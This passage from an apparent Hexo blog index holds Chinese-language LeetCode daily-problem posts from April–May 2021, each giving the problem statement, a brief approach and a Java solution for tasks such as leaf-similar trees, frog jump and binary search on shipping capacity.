    <content type="text"><![CDATA[题目：872. 叶子相似的树难度：简单 请考虑一棵二叉树上所有的叶子，这些叶子的值按从左到右的顺序排列形成一个 叶值序列 。 举个例子，如上图所示，给定一棵叶值序列为 (6, 7, 4, 9, 8) 的树。 如果有两棵二叉树的叶值序列是相同，那么我们就认为它们是 叶相似 的。 如果给定的两个根结点分别为 root1 和 root2 的树是叶相似的，则返回 true；否则返回 false 。 示例 1： 12输入：root1 = [3,5,1,6,2,9,8,null,null,7,4], root2 = [3,5,1,6,7,4,2,null,null,null,null,null,null,9,8]输出：true 示例 2： 12输入：root1 = [1], root2 = [1]输出：true 示例 3： 12输入：root1 = [1], root2 = [2]输出：false 示例 4： 12输入：root1 = [1,2], root2 = [2,2]输出：true 示例 5： 12输入：root1 = [1,2,3], root2 = [1,3,2]输出：false 提示： 给定的两棵树可能会有 1 到 200 个结点。 给定的两棵树上的值介于 0 到 200 之间。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/leaf-similar-trees/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先深度优先搜索拿到叶子序列，然后比较即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public boolean leafSimilar(TreeNode root1, TreeNode root2) &#123; List&lt;Integer&gt; l1 = new ArrayList&lt;&gt;(); List&lt;Integer&gt; l2 = new ArrayList&lt;&gt;(); dfs(root1,l1); dfs(root2,l2); if (l1.size() != l2.size()) &#123; return false; &#125; for (int i = 0;i &lt; l1.size();i++) &#123; if (!l1.get(i).equals(l2.get(i))) &#123; return false; &#125; &#125; return true; &#125; public void dfs(TreeNode root,List&lt;Integer&gt; l) &#123; if (root == null) &#123; return; &#125; dfs(root.left,l); if (root.left == null &amp;&amp; root.right == null) &#123; l.add(root.val); &#125; dfs(root.right,l); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/9]]></title>
    <url>%2Fposts%2F94bca3d2%2F</url>
    <content type="text"><![CDATA[题目：1482. 制作 m 束花所需的最少天数难度：中等 给你一个整数数组 bloomDay，以及两个整数 m 和 k 。 现需要制作 m 束花。制作花束时，需要使用花园中 相邻的 k 朵花 。 花园中有 n 朵花，第 i 朵花会在 bloomDay[i] 时盛开，恰好 可以用于 一束 花中。 请你返回从花园中摘 m 束花需要等待的最少的天数。如果不能摘到 m 束花则返回 -1 。 示例 1： 1234567输入：bloomDay = [1,10,3,10,2], m = 3, k = 1输出：3解释：让我们一起观察这三天的花开过程，x 表示花开，而 _ 表示花还未开。现在需要制作 3 束花，每束只需要 1 朵。1 天后：[x, _, _, _, _] // 只能制作 1 束花2 天后：[x, _, _, _, x] // 只能制作 2 束花3 天后：[x, _, x, _, x] // 可以制作 3 束花，答案为 3 示例 2： 123输入：bloomDay = [1,10,3,10,2], m = 3, k = 2输出：-1解释：要制作 3 束花，每束需要 2 朵花，也就是一共需要 6 朵花。而花园中只有 5 朵花，无法满足制作要求，返回 -1 。 示例 3： 12345678输入：bloomDay = [7,7,7,7,12,7,7], m = 2, k = 3输出：12解释：要制作 2 束花，每束需要 3 朵。花园在 7 天后和 12 天后的情况如下：7 天后：[x, x, x, x, _, x, x]可以用前 3 朵盛开的花制作第一束花。但不能使用后 3 朵盛开的花，因为它们不相邻。12 天后：[x, x, x, x, x, x, x]显然，我们可以用不同的方式制作两束花。 示例 4： 123输入：bloomDay = [1000000000,1000000000], m = 1, k = 1输出：1000000000解释：需要等 1000000000 天才能采到花来制作花束 示例 5： 12输入：bloomDay = [1,10,2,9,3,8,4,7,5,6], m = 4, k = 2输出：9 提示： bloomDay.length == n 1 &lt;= n &lt;= 10^5 1 &lt;= bloomDay[i] &lt;= 10^9 1 &lt;= m &lt;= 10^6 1 &lt;= k &lt;= n 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-number-of-days-to-make-m-bouquets/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看了好久没看懂题 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution &#123; public int minDays(int[] bloomDay, int m, int k) &#123; int ans = 0; int n = bloomDay.length; if (n / m &lt; k) &#123; ans = -1; return ans; &#125; int low = 0; int high = (int) (1e9); while (low &lt; high) &#123; int mid = (low + high) / 2; if (check(bloomDay,mid,m,k)) &#123; high = mid; &#125; else &#123; low = mid + 1; &#125; &#125; ans = high; return ans; &#125; private boolean check(int[] nums,int available,int m,int k) &#123; int cnt = 0; for (int i = 0;i &lt; nums.length;i++) &#123; if (nums[i] &lt;= available) &#123; int l = i + 1; boolean flag = false; while (l &lt; nums.length &amp;&amp; nums[l] &lt;= available) &#123; if (l - i &gt;= k) &#123; cnt++; if (cnt &gt;= m) &#123; return true; &#125; i = l - 1; flag = true; break; &#125; l++; &#125; if (!flag &amp;&amp; l - i &gt;= k) &#123; cnt++; &#125; &#125; &#125; return cnt &gt;= m; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/8]]></title>
    <url>%2Fposts%2Fe3bb9344%2F</url>
    <content type="text"><![CDATA[题目：1723. 完成所有工作的最短时间难度：困难 给你一个整数数组 jobs ，其中 jobs[i] 是完成第 i 项工作要花费的时间。 请你将这些工作分配给 k 位工人。所有工作都应该分配给工人，且每项工作只能分配给一位工人。工人的 工作时间 是完成分配给他们的所有工作花费时间的总和。请你设计一套最佳的工作分配方案，使工人的 最大工作时间 得以 最小化 。 返回分配方案中尽可能 最小 的 最大工作时间 。 示例 1： 123输入：jobs = [3,2,3], k = 3输出：3解释：给每位工人分配一项工作，最大工作时间是 3 。 示例 2： 123456输入：jobs = [1,2,4,7,8], k = 2输出：11解释：按下述方式分配工作：1 号工人：1、2、8（工作时间 = 1 + 2 + 8 = 11）2 号工人：4、7（工作时间 = 4 + 7 = 11）最大工作时间是 11 。 提示： 1 &lt;= k &lt;= jobs.length &lt;= 12 1 &lt;= jobs[i] &lt;= 107 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-minimum-time-to-finish-all-jobs/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 朴素的回溯算法是会超时的，必须剪枝处理 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public int minimumTimeRequired(int[] jobs, int k) &#123; int[] works = new int[k]; dfs(jobs,works,0,0); return ans; &#125; int ans = Integer.MAX_VALUE; private void dfs(int[] jobs,int[] works,int c,int max) &#123; if (max &gt;= ans) &#123; return; &#125; if (c == jobs.length) &#123; ans = max; return; &#125; Set&lt;Integer&gt; s = new HashSet&lt;&gt;(); for (int j = 0;j &lt; works.length;j++) &#123; if (!s.add(works[j])) &#123; continue; &#125; works[j] += jobs[c]; dfs(jobs,works,c + 1,Math.max(works[j],max)); works[j] -= jobs[c]; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/7]]></title>
    <url>%2Fposts%2F73048ed5%2F</url>
    <content type="text"><![CDATA[题目：1486. 数组异或操作难度：简单 给你两个整数，n 和 start 。 数组 nums 定义为：nums[i] = start + 2*i（下标从 0 开始）且 n == nums.length 。 请返回 nums 中所有元素按位异或（XOR）后得到的结果。 示例 1： 1234输入：n = 5, start = 0输出：8解释：数组 nums 为 [0, 2, 4, 6, 8]，其中 (0 ^ 2 ^ 4 ^ 6 ^ 8) = 8 。 &quot;^&quot; 为按位异或 XOR 运算符。 示例 2： 123输入：n = 4, start = 3输出：8解释：数组 nums 为 [3, 5, 7, 9]，其中 (3 ^ 5 ^ 7 ^ 9) = 8. 示例 3： 12输入：n = 1, start = 7输出：7 示例 4： 12输入：n = 10, start = 5输出：2 提示： 1 &lt;= n &lt;= 1000 0 &lt;= start &lt;= 1000 n == nums.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/xor-operation-in-an-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟 解题代码123456789class Solution &#123; public int xorOperation(int n, int start) &#123; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; ans ^= start + 2 * i; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/6]]></title>
    <url>%2Fposts%2F403be43%2F</url>
    <content type="text"><![CDATA[题目：1720. 解码异或后的数组难度：简单 未知 整数数组 arr 由 n 个非负整数组成。 经编码后变为长度为 n - 1 的另一个整数数组 encoded ，其中 encoded[i] = arr[i] XOR arr[i + 1] 。例如，arr = [1,0,2,1] 经编码后得到 encoded = [1,2,3] 。 给你编码后的数组 encoded 和原数组 arr 的第一个元素 first（arr[0]）。 请解码返回原数组 arr 。可以证明答案存在并且是唯一的。 示例 1： 123输入：encoded = [1,2,3], first = 1输出：[1,0,2,1]解释：若 arr = [1,0,2,1] ，那么 first = 1 且 encoded = [1 XOR 0, 0 XOR 2, 2 XOR 1] = [1,2,3] 示例 2： 12输入：encoded = [6,2,7,3], first = 4输出：[4,2,0,7,4] 提示： 2 &lt;= n &lt;= 104 encoded.length == n - 1 0 &lt;= encoded[i] &lt;= 105 0 &lt;= first &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/decode-xored-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 a ^ b ^ b -&gt; a 解题代码12345678910class Solution &#123; public int[] decode(int[] encoded, int first) &#123; int[] ans = new int[encoded.length + 1]; ans[0] = first; for (int i = 1;i &lt; ans.length;i++) &#123; ans[i] = ans[i - 1] ^ encoded[i - 1]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/3]]></title>
    <url>%2Fposts%2F74694acc%2F</url>
    <content type="text"><![CDATA[题目：7. 整数反转难度：简单 给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。 如果反转后整数超过 32 位的有符号整数的范围 [−231, 231 − 1] ，就返回 0。 假设环境不允许存储 64 位整数（有符号或无符号）。 示例 1： 12输入：x = 123输出：321 示例 2： 12输入：x = -123输出：-321 示例 3： 12输入：x = 120输出：21 示例 4： 12输入：x = 0输出：0 提示： -231 &lt;= x &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-integer/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 整数反转 经典辗转相除法 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public int reverse(int x) &#123; if (x == 0) &#123; return 0; &#125; long ans = 0; int sign = 1; if (x &lt; 0) &#123; sign = -1; x = - x; &#125; while (x != 0) &#123; int m = x % 10; x = x / 10; ans = ans * 10 + m; &#125; ans = ans * sign; if (ans &gt; Integer.MAX_VALUE) &#123; return 0; &#125; if (ans &lt; Integer.MIN_VALUE) &#123; return 0; &#125; return (int) (ans); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/2]]></title>
    <url>%2Fposts%2F36e7a5a%2F</url>
    <content type="text"><![CDATA[题目：554. 砖墙难度：中等 你的面前有一堵矩形的、由 n 行砖块组成的砖墙。这些砖块高度相同（也就是一个单位高）但是宽度不同。每一行砖块的宽度之和应该相等。 你现在要画一条 自顶向下 的、穿过 最少 砖块的垂线。如果你画的线只是从砖块的边缘经过，就不算穿过这块砖。 你不能沿着墙的两个垂直边缘之一画线，这样显然是没有穿过一块砖的。 给你一个二维数组 wall ，该数组包含这堵墙的相关信息。其中，wall[i] 是一个代表从左至右每块砖的宽度的数组。你需要找出怎样画才能使这条线 穿过的砖块数量最少 ，并且返回 穿过的砖块数量 。 示例 1： 12输入：wall = [[1,2,2,1],[3,1,2],[1,3,2],[2,4],[3,1,2],[1,3,1,1]]输出：2 示例 2： 12输入：wall = [[1],[1],[1]]输出：3 提示： n == wall.length 1 &lt;= n &lt;= 104 1 &lt;= wall[i].length &lt;= 104 1 &lt;= sum(wall[i].length) &lt;= 2 * 104 对于每一行 i ，sum(wall[i]) 应当是相同的 1 &lt;= wall[i][j] &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/brick-wall/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看懂题目最重要 搬砖人 解题代码12345678910111213141516class Solution &#123; public int leastBricks(List&lt;List&lt;Integer&gt;&gt; wall) &#123; int ans = 0; Map&lt;Integer,Integer&gt; m = new HashMap&lt;&gt;(); int max = 0; for (List&lt;Integer&gt; w : wall) &#123; int d = 0; for (int i = 0;i &lt; w.size() - 1;i++) &#123; d += w.get(i); m.put(d,m.getOrDefault(d,0) + 1); max = Math.max(m.get(d),max); &#125; &#125; return wall.size() - max; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/1]]></title>
    <url>%2Fposts%2F9a672be0%2F</url>
    <content type="text"><![CDATA[题目：690. 员工的重要性难度：简单 给定一个保存员工信息的数据结构，它包含了员工 唯一的 id ， 重要度 和 直系下属的 id 。 比如，员工 1 是员工 2 的领导，员工 2 是员工 3 的领导。他们相应的重要度为 15 , 10 , 5 。那么员工 1 的数据结构是 [1, 15, [2]] ，员工 2的 数据结构是 [2, 10, [3]] ，员工 3 的数据结构是 [3, 5, []] 。注意虽然员工 3 也是员工 1 的一个下属，但是由于 并不是直系 下属，因此没有体现在员工 1 的数据结构中。 现在输入一个公司的所有员工信息，以及单个员工 id ，返回这个员工和他所有下属的重要度之和。 示例： 1234输入：[[1, 5, [2, 3]], [2, 3, []], [3, 3, []]], 1输出：11解释：员工 1 自身的重要度是 5 ，他有两个直系下属 2 和 3 ，而且 2 和 3 的重要度均为 3 。因此员工 1 的总重要度是 5 + 3 + 3 = 11 。 提示： 一个员工最多有一个 直系 领导，但是可以有多个 直系 下属 员工数量不超过 2000 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/employee-importance/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 很裸的一个搜索题，劳动人民表示很欢乐 解题代码123456789101112131415161718192021222324252627282930313233343536/*// Definition for Employee.class Employee &#123; public int id; public int importance; public List&lt;Integer&gt; subordinates;&#125;;*/class Solution &#123; public int getImportance(List&lt;Employee&gt; employees, int id) &#123; Map&lt;Integer,Employee&gt; m = new HashMap&lt;&gt;(); Employee s = null; for (Employee e : employees) &#123; m.put(e.id,e); if (e.id == id) &#123; s = e; &#125; &#125; return dfs(s,m); &#125; public int dfs(Employee e,Map&lt;Integer,Employee&gt; m) &#123; if (e == null) &#123; return 0; &#125; if (e.subordinates.size() == 0) &#123; return e.importance; &#125; int ans = e.importance; for (int id : e.subordinates) &#123; ans += dfs(m.get(id),m); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/30]]></title>
    <url>%2Fposts%2Fdec15f95%2F</url>
    <content type="text"><![CDATA[题目：137. 只出现一次的数字 II难度：中等 给你一个整数数组 nums ，除某个元素仅出现 一次 外，其余每个元素都恰出现 三次 。 请你找出并返回那个只出现了一次的元素。 示例 1： 12输入：nums = [2,2,3,2]输出：3 示例 2： 12输入：nums = [0,1,0,1,0,1,99]输出：99 提示： 1 &lt;= nums.length &lt;= 3 * 104 -231 &lt;= nums[i] &lt;= 231 - 1 nums 中，除某个元素仅出现 一次 外，其余每个元素都恰出现 三次 进阶： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/single-number-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按三进制不进位加法去做 最后就会只剩单独的那个元素 也就是ans 但是计算机中位运算是基于二进制的，因此我们需要对每一位二进制数考虑加起来 mod 3，也就是对每一位二进制数都进行加法运算，然后mod 3 这样就和做三进制不进位加法的效果是相同的了 最后只需要恢复每一位为十进制数即可 解题代码12345678910111213141516class Solution &#123; public int singleNumber(int[] nums) &#123; int ans = 0; int m = 1; for (int i = 0;i &lt; 32;i++) &#123; int t = 0; for (int n : nums) &#123; t += ((n &gt;&gt; i) &amp; 1); &#125; t = t % 3; ans = ans + m * t; m *= 2; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/29]]></title>
    <url>%2Fposts%2Fbe06d670%2F</url>
    <content type="text"><![CDATA[题目：403. 青蛙过河难度：困难 一只青蛙想要过河。 假定河流被等分为若干个单元格，并且在每一个单元格内都有可能放有一块石子（也有可能没有）。 青蛙可以跳上石子，但是不可以跳入水中。 给你石子的位置列表 stones（用单元格序号 升序 表示）， 请判定青蛙能否成功过河（即能否在最后一步跳至最后一块石子上）。 开始时， 青蛙默认已站在第一块石子上，并可以假定它第一步只能跳跃一个单位（即只能从单元格 1 跳至单元格 2 ）。 如果青蛙上一步跳跃了 k 个单位，那么它接下来的跳跃距离只能选择为 k - 1、k 或 k + 1 个单位。 另请注意，青蛙只能向前方（终点的方向）跳跃。 示例 1： 123输入：stones = [0,1,3,5,6,8,12,17]输出：true解释：青蛙可以成功过河，按照如下方案跳跃：跳 1 个单位到第 2 块石子, 然后跳 2 个单位到第 3 块石子, 接着 跳 2 个单位到第 4 块石子, 然后跳 3 个单位到第 6 块石子, 跳 4 个单位到第 7 块石子, 最后，跳 5 个单位到第 8 个石子（即最后一块石子）。 示例 2： 123输入：stones = [0,1,2,3,4,8,9,11]输出：false解释：这是因为第 5 和第 6 个石子之间的间距太大，没有可选的方案供青蛙跳跃过去。 提示： 2 &lt;= stones.length &lt;= 2000 0 &lt;= stones[i] &lt;= 231 - 1 stones[0] == 0 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/frog-jump/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 可以很容易的写出搜索函数，然后改成记忆化搜索，优化效率 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; private Boolean[][] ms; private Map&lt;Integer,Integer&gt; map; public boolean canCross(int[] stones) &#123; int n = stones.length; ms = new Boolean[n][n]; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; n;i++) &#123; map.put(stones[i],i); &#125; return dfs(stones, 0, 0); &#125; private boolean dfs(int[] stones, int i, int lastDis) &#123; if (i == stones.length - 1) &#123; return true; &#125; if (ms[i][lastDis] != null) &#123; return ms[i][lastDis]; &#125; for (int curDis = lastDis - 1; curDis &lt;= lastDis + 1; curDis++) &#123; if (curDis &gt; 0) &#123; int j = map.getOrDefault(curDis + stones[i],-1); if (j &gt;= 0 &amp;&amp; dfs(stones, j, curDis)) &#123; return ms[i][lastDis] = true; &#125; &#125; &#125; return ms[i][lastDis] = false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/28]]></title>
    <url>%2Fposts%2Fc901e6e6%2F</url>
    <content type="text"><![CDATA[题目：633. 平方数之和难度：中等 给定一个非负整数 c ，你要判断是否存在两个整数 a 和 b，使得 a2 + b2 = c 。 示例 1： 123输入：c = 5输出：true解释：1 * 1 + 2 * 2 = 5 示例 2： 12输入：c = 3输出：false 示例 3： 12输入：c = 4输出：true 示例 4： 12输入：c = 2输出：true 示例 5： 12输入：c = 1输出：true 提示： 0 &lt;= c &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sum-of-square-numbers/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 枚举 解题代码12345678910111213141516class Solution &#123; public boolean judgeSquareSum(int c) &#123; int q = (int) (Math.sqrt(c)); for (int i = 0;i &lt;= q;i++) &#123; if (judge(c - i * i)) &#123; return true; &#125; &#125; return false; &#125; private boolean judge(int c) &#123; int q = (int) (Math.sqrt(c)); return c == q * q; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/27]]></title>
    <url>%2Fposts%2F59befb77%2F</url>
    <content type="text"><![CDATA[题目：938. 二叉搜索树的范围和难度：简单 给定二叉搜索树的根结点 root，返回值位于范围 [low, high] 之间的所有结点的值的和。 示例 1： 12输入：root = [10,5,15,3,7,null,18], low = 7, high = 15输出：32 示例 2： 12输入：root = [10,5,15,3,7,13,18,1,null,6], low = 6, high = 10输出：23 提示： 树中节点数目在范围 [1, 2 * 104] 内 1 &lt;= Node.val &lt;= 105 1 &lt;= low &lt;= high &lt;= 105 所有 Node.val 互不相同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/range-sum-of-bst/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 深度优先搜索即可 解题代码12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public int rangeSumBST(TreeNode root, int low, int high) &#123; return dfs(root,low,high); &#125; public int dfs(TreeNode root,int low,int high) &#123; if (root == null) &#123; return 0; &#125; int v = root.val; if (v &gt; high) &#123; return dfs(root.left,low,high); &#125; else if (v &lt; low) &#123; return dfs(root.right,low,high); &#125; else &#123; return v + dfs(root.right,low,high) + dfs(root.left,low,high); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/26]]></title>
    <url>%2Fposts%2F2eb9cbe1%2F</url>
    <content type="text"><![CDATA[题目：1011. 在 D 天内送达包裹的能力难度：中等 传送带上的包裹必须在 D 天内从一个港口运送到另一个港口。 传送带上的第 i 个包裹的重量为 weights[i]。每一天，我们都会按给出重量的顺序往传送带上装载包裹。我们装载的重量不会超过船的最大运载重量。 返回能在 D 天内将传送带上的所有包裹送达的船的最低运载能力。 示例 1： 1234567891011输入：weights = [1,2,3,4,5,6,7,8,9,10], D = 5输出：15解释：船舶最低载重 15 就能够在 5 天内送达所有包裹，如下所示：第 1 天：1, 2, 3, 4, 5第 2 天：6, 7第 3 天：8第 4 天：9第 5 天：10请注意，货物必须按照给定的顺序装运，因此使用载重能力为 14 的船舶并将包装分成 (2, 3, 4, 5), (1, 6, 7), (8), (9), (10) 是不允许的。 示例 2： 1234567输入：weights = [3,2,2,4,1,4], D = 3输出：6解释：船舶最低载重 6 就能够在 3 天内送达所有包裹，如下所示：第 1 天：3, 2第 2 天：2, 4第 3 天：1, 4 示例 3： 1234567输入：weights = [1,2,3,1,1], D = 4输出：3解释：第 1 天：1第 2 天：2第 3 天：3第 4 天：1, 1 提示： 1 &lt;= D &lt;= weights.length &lt;= 50000 1 &lt;= weights[i] &lt;= 500 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/capacity-to-ship-packages-within-d-days/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分 重量 取值为：[包裹重量的最大值，所有包裹重量之和]，计算出在该重量下，实际需要运送的时间need，考虑need和给定值D的关系 解题代码12345678910111213141516171819202122232425262728293031323334class Solution &#123; public int shipWithinDays(int[] weights, int D) &#123; int r = 0; int l = 0; for (int i = 0;i &lt; weights.length;i++) &#123; r += weights[i]; l = Math.max(l,weights[i]); &#125; while (l &lt; r) &#123; int m = (l + r) / 2; int need = 1; int cur = 0; for (int i = 0;i &lt; weights.length;i++) &#123; if (cur + weights[i] &gt; m) &#123; need++; cur = 0; cur += weights[i]; &#125; else &#123; cur += weights[i]; &#125; &#125; if (need &lt;= D) &#123; r = m; &#125; else &#123; l = m + 1; &#125; &#125; return l; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/25]]></title>
    <url>%2Fposts%2Fb7b09a5b%2F</url>
    <content type="text"><![CDATA[题目：897. 递增顺序搜索树难度：简单 给你一棵二叉搜索树，请你 按中序遍历 将其重新排列为一棵递增顺序搜索树，使树中最左边的节点成为树的根节点，并且每个节点没有左子节点，只有一个右子节点。 示例 1： 12输入：root = [5,3,6,2,4,null,8,1,null,null,null,7,9]输出：[1,null,2,null,3,null,4,null,5,null,6,null,7,null,8,null,9] 示例 2： 12输入：root = [5,1,7]输出：[1,null,5,null,7] 提示： 树中节点数的取值范围是 [1, 100] 0 &lt;= Node.val &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/increasing-order-search-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 中序遍历的过程中重新构建树 解题代码123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public TreeNode increasingBST(TreeNode root) &#123; dfs(root); return head; &#125; TreeNode head; TreeNode cur; private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); if (head == null) &#123; head = new TreeNode(root.val); cur = head; &#125; else &#123; cur.right = new TreeNode(root.val); cur = cur.right; &#125; dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/24]]></title>
    <url>%2Fposts%2Fc0b7aacd%2F</url>
